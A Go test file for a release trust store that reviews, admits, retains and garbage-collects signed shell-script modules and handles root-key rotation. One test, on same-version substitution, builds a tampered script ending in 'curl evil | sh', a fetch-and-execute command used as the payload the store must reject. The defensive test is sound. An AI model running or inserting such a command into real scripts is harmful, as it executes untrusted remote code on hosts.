// SPDX-License-Identifier: AGPL-3.0-or-later

package trust

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/nebula-operation-station/nebula-operation-station/internal/release"
	"github.com/nebula-operation-station/nebula-operation-station/internal/textdiff"
)

const (
	scriptV1 = "#!/bin/sh\nset -eu\nsystemctl restart docker\n"
	scriptV2 = "#!/bin/sh\nset -eu\nsystemctl daemon-reload\nsystemctl restart docker\n"
)

func TestOpenBootstrapsAndPersists(t *testing.T) {
	e := newEnv(t)
	if g := e.s.Generation(); g != 0 {
		t.Fatalf("generation %d", g)
	}
	if r := e.s.Roots(); len(r) != 1 || r[0].ID != "root-1" {
		t.Fatalf("roots %+v", r)
	}
	e.admit(e.candidate("1.0.0", docker("1.0.0", scriptV1)))
	e.reopen()
	m, ok := e.s.Module("docker")
	if !ok || m.Active == nil || m.Active.Version != "1.0.0" || e.s.Generation() != 1 {
		t.Fatalf("after restart: %+v", m)
	}
}

func TestOpenBlocksOnMissingOrCorruptState(t *testing.T) {
	e := newEnv(t)
	e.admit(e.candidate("1.0.0", docker("1.0.0", scriptV1)))
	idx := filepath.Join(e.dir, indexFile)
	raw, _ := os.ReadFile(idx)

	os.Remove(idx)
	if _, err := Open(e.dir, e.k.anchors(), nil); !errors.Is(err, ErrStateMissing) {
		t.Fatalf("missing index with objects: %v", err)
	}
	for name, b := range map[string][]byte{
		"garbage":           []byte("{"),
		"unknown field":     []byte(strings.Replace(string(raw), `{"format"`, `{"extra":1,"format"`, 1)),
		"wrong format":      []byte(strings.Replace(string(raw), IndexFormat, "x", 1)),
		"dropped tombstone": []byte(string(raw[:strings.Index(string(raw), `"tombstones":[`)]) + `"tombstones":[]}`),
	} {
		os.WriteFile(idx, b, 0o600)
		if _, err := Open(e.dir, e.k.anchors(), nil); !errors.Is(err, ErrCorrupt) {
			t.Errorf("%s: %v", name, err)
		}
	}
	os.Remove(idx)
	os.Symlink(filepath.Join(t.TempDir(), "x"), idx)
	if _, err := Open(e.dir, e.k.anchors(), nil); err == nil {
		t.Error("symlinked index accepted")
	}
}

// First use: every module and action is new and shown in full.
func TestReviewFirstUseShowsFullContent(t *testing.T) {
	e := newEnv(t)
	r, err := e.s.Review(e.candidate("1.0.0", docker("1.0.0", scriptV1)))
	if err != nil {
		t.Fatal(err)
	}
	m := r.Modules[0]
	if m.Status != StatusNew || !m.FullReview || !r.NeedsConfirmation() || r.RootID != "root-1" {
		t.Fatalf("review %+v", r)
	}
	a := m.Actions[0]
	if a.ActionID != "docker.restart" || a.Status != StatusNew || len(a.Diff) != 3 || a.Diff[2] != (textdiff.Line{Op: textdiff.Insert, Text: "systemctl restart docker"}) {
		t.Fatalf("action %+v", a)
	}
}

// Re-importing the active release is idempotent: nothing to confirm, no
// transition, no age reset.
func TestUnchangedNeedsNoConfirmationAndKeepsAge(t *testing.T) {
	e := newEnv(t)
	e.admit(e.candidate("1.0.0", docker("1.0.0", scriptV1)))
	before, _ := e.s.Module("docker")
	e.now = e.now.Add(48 * time.Hour)
	r, res := e.admit(e.candidate("1.0.1", docker("1.0.0", scriptV1)))
	if r.NeedsConfirmation() || r.Modules[0].Status != StatusUnchanged || len(res.Activated) != 0 || len(res.Superseded) != 0 {
		t.Fatalf("review %+v result %+v", r, res)
	}
	after, _ := e.s.Module("docker")
	if !after.Active.AcceptedAt.Equal(before.Active.AcceptedAt) || !after.Active.ActivatedAt.Equal(before.Active.ActivatedAt) || len(after.History) != 0 {
		t.Fatalf("age reset: %+v -> %+v", before.Active, after.Active)
	}
}

// A changed module is diffed against the exact retained previous bytes;
// new and removed actions and removed modules are explicit.
func TestReviewDiffsAgainstExactPreviousBytes(t *testing.T) {
	e := newEnv(t)
	e.admit(e.candidate("1.0.0",
		mod{name: "docker", version: "1.0.0", actions: map[string]string{"restart": scriptV1, "prune": "#!/bin/sh\ndocker system prune -f\n"}},
		mod{name: "core", version: "1.0.0", actions: map[string]string{"uptime": "#!/bin/sh\nuptime\n"}}))
	r, err := e.s.Review(e.candidate("1.1.0",
		mod{name: "docker", version: "1.1.0", risk: "HIGH", actions: map[string]string{"restart": scriptV2, "logs": "#!/bin/sh\njournalctl -u docker\n"}}))
	if err != nil {
		t.Fatal(err)
	}
	if len(r.Modules) != 2 || r.Modules[0].Name != "core" || r.Modules[0].Status != StatusRemoved || r.Modules[0].Actions[0].Status != StatusRemoved {
		t.Fatalf("removed module not explicit: %+v", r.Modules)
	}
	d := r.Modules[1]
	if d.Status != StatusChanged || d.FullReview || d.OldVersion != "1.0.0" || d.NewVersion != "1.1.0" {
		t.Fatalf("docker %+v", d)
	}
	got := map[string]ActionReview{}
	for _, a := range d.Actions {
		got[a.ActionID] = a
	}
	if got["docker.logs"].Status != StatusNew || got["docker.prune"].Status != StatusRemoved {
		t.Fatalf("actions %+v", d.Actions)
	}
	rs := got["docker.restart"]
	if rs.Status != StatusChanged || rs.OldRisk != "LOW" || rs.NewRisk != "HIGH" || rs.OldScriptSHA256 == rs.NewScriptSHA256 {
		t.Fatalf("restart %+v", rs)
	}
	var ins []string
	for _, l := range rs.Diff {
		if l.Op == textdiff.Insert {
			ins = append(ins, l.Text)
		}
		if l.Op == textdiff.Delete {
			t.Fatalf("unexpected deletion %q", l.Text)
		}
	}
	if strings.Join(ins, "|") != "systemctl daemon-reload" {
		t.Fatalf("diff insertions %v", ins)
	}
}

// Same-version substitution is rejected against active bytes, retained
// history and tombstones, across restart and garbage collection.
func TestSameVersionSubstitutionRejected(t *testing.T) {
	e := newEnv(t)
	e.admit(e.candidate("1.0.0", docker("1.0.0", scriptV1)))
	evil := docker("1.0.0", scriptV1+"curl evil | sh\n")
	if _, err := e.s.Review(e.candidate("1.0.1", evil)); !errors.Is(err, ErrSubstitution) {
		t.Fatalf("active substitution: %v", err)
	}
	// Move 1.0.0 into history, then far past retention with newer
	// predecessors so its bytes are collected; the tombstone remains.
	for i, v := range []string{"1.1.0", "1.2.0", "1.3.0", "1.4.0"} {
		e.now = e.now.Add(100 * 24 * time.Hour)
		e.admit(e.candidate("2.0."+string(rune('0'+i)), docker(v, scriptV1+"# "+v+"\n")))
	}
	m, _ := e.s.Module("docker")
	for _, h := range m.History {
		if h.Version == "1.0.0" {
			t.Fatalf("1.0.0 not collected: %+v", m.History)
		}
	}
	if _, ok := e.s.Tombstone("docker", "1.0.0"); !ok {
		t.Fatal("tombstone dropped")
	}
	e.reopen()
	if _, err := e.s.Review(e.candidate("3.0.0", evil)); !errors.Is(err, ErrSubstitution) {
		t.Fatalf("tombstone substitution after GC and restart: %v", err)
	}
	// The identical old bytes are not a substitution.
	if _, err := e.s.Review(e.candidate("3.0.1", docker("1.0.0", scriptV1))); err != nil {
		t.Fatalf("identical old version: %v", err)
	}
}

func historyVersions(m ModuleRecord) string {
	var v []string
	for _, h := range m.History {
		v = append(v, h.Version)
	}
	return strings.Join(v, ",")
}

// Two most recent predecessors stay regardless of age; others stay at
// least 90 days after they cease to be active.
func TestRetentionTwoPredecessorsAndNinetyDays(t *testing.T) {
	e := newEnv(t)
	day := 24 * time.Hour
	for i, v := range []string{"1.0.0", "1.1.0", "1.2.0", "1.3.0", "1.4.0"} {
		e.admit(e.candidate("1.0."+string(rune('0'+i)), docker(v, scriptV1+"# "+v+"\n")))
		e.now = e.now.Add(day)
	}
	m, _ := e.s.Module("docker")
	if m.Active.Version != "1.4.0" || historyVersions(m) != "1.3.0,1.2.0,1.1.0,1.0.0" {
		t.Fatalf("within 90 days everything stays: %s", historyVersions(m))
	}
	// 1.0.0 was superseded on day 1; on day 92 it is past its floor.
	e.now = e.now.Add(86 * day)
	e.admit(e.candidate("1.0.9", docker("1.4.0", scriptV1+"# 1.4.0\n"), mod{name: "core", version: "1.0.0", actions: map[string]string{"x": "#!/bin/sh\n"}}))
	m, _ = e.s.Module("docker")
	if historyVersions(m) != "1.3.0,1.2.0,1.1.0" {
		t.Fatalf("after 1.0.0's floor: %s", historyVersions(m))
	}
	// Long after, only the two most recent predecessors remain.
	e.now = e.now.Add(365 * day)
	e.admit(e.candidate("2.0.0", docker("1.4.0", scriptV1+"# 1.4.0\n")))
	m, _ = e.s.Module("docker")
	if historyVersions(m) != "1.3.0,1.2.0" {
		t.Fatalf("baseline: %s", historyVersions(m))
	}
	// Collected bytes are really gone from disk.
	entries, _ := os.ReadDir(filepath.Join(e.dir, objectsDir))
	for _, ent := range entries {
		if ent.Name() == hexSum(docker("1.0.0", scriptV1+"# 1.0.0\n").tar(t)) {
			t.Fatal("collected bytes still on disk")
		}
	}
}

// A backward clock never makes bytes eligible early, and reactivation
// never shortens a retention floor.
func TestRetentionClockRollbackAndReactivation(t *testing.T) {
	e := newEnv(t)
	day := 24 * time.Hour
	for i, v := range []string{"1.0.0", "1.1.0", "1.2.0", "1.3.0"} {
		e.admit(e.candidate("1.0."+string(rune('0'+i)), docker(v, scriptV1+"# "+v+"\n")))
		e.now = e.now.Add(day)
	}
	high := e.now.Add(200 * day)
	e.now = high
	e.admit(e.candidate("1.1.0", docker("1.3.0", scriptV1+"# 1.3.0\n"), mod{name: "core", version: "1.0.0", actions: map[string]string{"x": "#!/bin/sh\n"}}))
	m, _ := e.s.Module("docker")
	if historyVersions(m) != "1.2.0,1.1.0" {
		t.Fatalf("baseline at high water: %s", historyVersions(m))
	}
	// Reactivate 1.1.0, then supersede it again: its floor restarts.
	e.admit(e.candidate("1.2.0", docker("1.1.0", scriptV1+"# 1.1.0\n")))
	m, _ = e.s.Module("docker")
	if m.Active.Version != "1.1.0" || historyVersions(m) != "1.3.0,1.2.0" {
		t.Fatalf("reactivation: active %s history %s", m.Active.Version, historyVersions(m))
	}
	e.admit(e.candidate("1.3.0", docker("1.5.0", scriptV1+"# 1.5.0\n")))
	m, _ = e.s.Module("docker")
	var floor time.Time
	for _, h := range m.History {
		if h.Version == "1.1.0" {
			floor = h.RetainUntil
		}
	}
	if !floor.Equal(high.Add(Retention)) {
		t.Fatalf("1.1.0 floor %v, want %v", floor, high.Add(Retention))
	}
	// 1.2.0 is third and past its floor: collected.
	if historyVersions(m) != "1.1.0,1.3.0" {
		t.Fatalf("history: %s", historyVersions(m))
	}
	// Clock goes back a year: supersession times never move back.
	e.now = high.Add(-365 * day)
	e.admit(e.candidate("1.4.0", docker("1.6.0", scriptV1+"# 1.6.0\n")))
	m, _ = e.s.Module("docker")
	if historyVersions(m) != "1.5.0,1.1.0,1.3.0" || !m.History[0].SupersededAt.Equal(high) {
		t.Fatalf("after rollback: %s, superseded at %v (want %v)", historyVersions(m), m.History[0].SupersededAt, high)
	}
}

// While the wall clock is behind the high-water mark, nothing is
// garbage-collected, even bytes that would be eligible.
func TestGarbageCollectionSkippedWhileClockBehind(t *testing.T) {
	e := newEnv(t)
	day := 24 * time.Hour
	t0 := e.now
	for i, v := range []string{"1.0.0", "1.1.0", "1.2.0"} {
		e.now = t0.Add(time.Duration(i) * day)
		e.admit(e.candidate("1.0."+string(rune('0'+i)), docker(v, scriptV1+"# "+v+"\n")))
	}
	core := func(v string) mod {
		return mod{name: "core", version: v, actions: map[string]string{"x": "#!/bin/sh\n# " + v + "\n"}}
	}
	e.now = t0.Add(200 * day)
	e.admit(e.candidate("1.1.0", docker("1.2.0", scriptV1+"# 1.2.0\n"), core("1.0.0")))
	e.now = t0.Add(100 * day)
	e.admit(e.candidate("1.2.0", docker("1.3.0", scriptV1+"# 1.3.0\n"), core("1.0.0")))
	m, _ := e.s.Module("docker")
	if historyVersions(m) != "1.2.0,1.1.0,1.0.0" {
		t.Fatalf("collected with the clock behind: %s", historyVersions(m))
	}
	e.now = t0.Add(201 * day)
	e.admit(e.candidate("1.3.0", docker("1.3.0", scriptV1+"# 1.3.0\n"), core("1.0.1")))
	m, _ = e.s.Module("docker")
	if historyVersions(m) != "1.2.0,1.1.0" {
		t.Fatalf("not collected once the clock recovered: %s", historyVersions(m))
	}
}

func TestAdmitRejectsStaleReview(t *testing.T) {
	e := newEnv(t)
	c1 := e.candidate("1.0.0", docker("1.0.0", scriptV1))
	r1, err := e.s.Review(c1)
	if err != nil {
		t.Fatal(err)
	}
	// A concurrent admission changes the generation.
	e.admit(e.candidate("0.9.0", mod{name: "core", version: "1.0.0", actions: map[string]string{"x": "#!/bin/sh\n"}}))
	if _, err := e.s.Admit(c1, r1); !errors.Is(err, ErrStale) {
		t.Fatalf("stale generation: %v", err)
	}
	// Bytes substituted after review.
	c2 := e.candidate("1.0.1", docker("1.0.0", scriptV1))
	r2, _ := e.s.Review(c2)
	c2.Modules[0].Tar = append([]byte{}, c2.Modules[0].Tar...)
	c2.Modules[0].Tar[600] ^= 1
	if _, err := e.s.Admit(c2, r2); !errors.Is(err, ErrStale) {
		t.Fatalf("substituted bytes: %v", err)
	}
	// A review of a different candidate cannot be replayed.
	c3 := e.candidate("1.0.2", docker("1.0.0", scriptV1))
	if _, err := e.s.Admit(c3, r2); !errors.Is(err, ErrStale) {
		t.Fatalf("review replayed for another manifest: %v", err)
	}
}

func TestAdmitQuotaChangesNothing(t *testing.T) {
	e := newEnv(t)
	e.free = 1024
	c := e.candidate("1.0.0", docker("1.0.0", scriptV1))
	r, _ := e.s.Review(c)
	if _, err := e.s.Admit(c, r); !errors.Is(err, ErrQuota) {
		t.Fatalf("free space: %v", err)
	}
	if e.s.Generation() != 0 {
		t.Fatal("generation changed")
	}
	entries, _ := os.ReadDir(filepath.Join(e.dir, objectsDir))
	if len(entries) != 0 {
		t.Fatalf("objects written on a rejected admission: %d", len(entries))
	}
	if _, ok := e.s.Module("docker"); ok {
		t.Fatal("module recorded")
	}
}

// Missing or corrupt previous bytes force full review, never unchanged
// or a diff; admission repairs the bytes.
func TestMissingPreviousBytesForceFullReview(t *testing.T) {
	e := newEnv(t)
	c := e.candidate("1.0.0", docker("1.0.0", scriptV1))
	e.admit(c)
	obj := filepath.Join(e.dir, objectsDir, c.Manifest.Modules[0].SHA256)
	os.WriteFile(obj, []byte("corrupt"), 0o600)
	r, err := e.s.Review(e.candidate("1.0.1", docker("1.0.0", scriptV1)))
	if err != nil {
		t.Fatal(err)
	}
	if m := r.Modules[0]; m.Status == StatusUnchanged || !m.FullReview {
		t.Fatalf("corrupt bytes inferred unchanged: %+v", m)
	}
	os.Remove(obj)
	r, _ = e.s.Review(e.candidate("1.1.0", docker("1.1.0", scriptV2)))
	if m := r.Modules[0]; !m.FullReview || m.Actions[0].Status != StatusNew {
		t.Fatalf("missing bytes diffed: %+v", m)
	}
	e.admit(e.candidate("1.0.2", docker("1.0.0", scriptV1)))
	if b, err := os.ReadFile(obj); err != nil || hexSum(b) != c.Manifest.Modules[0].SHA256 {
		t.Fatal("bytes not repaired")
	}
}

func TestApplyRotationIsDurableAndBindsAdmission(t *testing.T) {
	e := newEnv(t)
	r2 := newTestSK(t)
	c := e.candidate("1.0.0", docker("1.0.0", scriptV1))
	rv, _ := e.s.Review(c)

	doc := canon(t, map[string]any{"format": release.RotationFormat, "sequence": 1, "previous_sha256": release.ZeroDigest,
		"add": []any{map[string]any{"id": "root-2", "public_key": release.FormatRootKey(r2.pub)}}, "revoke": []any{}})
	sig := e.k.sign(t, doc)
	if _, err := e.s.ApplyRotation(doc, sig); err != nil {
		t.Fatal(err)
	}
	// The review predates the rotation: stale.
	if _, err := e.s.Admit(c, rv); !errors.Is(err, ErrStale) {
		t.Fatalf("pre-rotation review: %v", err)
	}
	e.reopen()
	if st := e.s.RootState(); st.Sequence != 1 || len(e.s.Roots()) != 2 {
		t.Fatalf("rotation not durable: %+v", st)
	}
	if _, err := e.s.ApplyRotation(doc, sig); !errors.Is(err, release.ErrRotation) {
		t.Fatalf("replay after restart: %v", err)
	}
	// root-2 revokes root-1: a root-1 release can no longer be admitted.
	doc2 := canon(t, map[string]any{"format": release.RotationFormat, "sequence": 2, "previous_sha256": hexSum(doc),
		"add": []any{}, "revoke": []any{"root-1"}})
	if _, err := e.s.ApplyRotation(doc2, r2.sign(t, doc2)); err != nil {
		t.Fatal(err)
	}
	if _, err := tryCandidate(t, e.k, e.s.Roots(), "1.0.1", nil, docker("1.0.0", scriptV1)); !errors.Is(err, release.ErrUntrusted) {
		t.Fatalf("revoked root admitted: %v", err)
	}
	// Bootstrap anchors never reset durable state.
	e.reopen()
	if len(e.s.Roots()) != 1 || e.s.Roots()[0].ID != "root-2" {
		t.Fatalf("roots after restart: %+v", e.s.Roots())
	}
}
